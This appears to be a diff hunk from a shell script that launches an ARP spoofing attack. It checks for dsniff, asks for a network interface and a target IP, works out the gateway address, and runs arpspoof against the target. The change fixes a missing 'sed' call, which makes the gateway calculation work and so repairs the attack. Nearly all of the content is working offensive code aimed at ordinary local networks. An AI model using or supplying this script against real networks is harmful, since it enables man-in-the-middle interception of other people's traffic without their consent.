@@ -11,7 +11,7 @@ check_command "dsniff"
 
 read -p "Insert your network interface: " interface
 read -p "Insert IP for attack: " ip
-gateway=$(echo $ip | 's/\([0-9]\+\)$/1/g')
+gateway=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')
 
 arpspoof -i "$interface" -t "$ip" "$gateway"
 
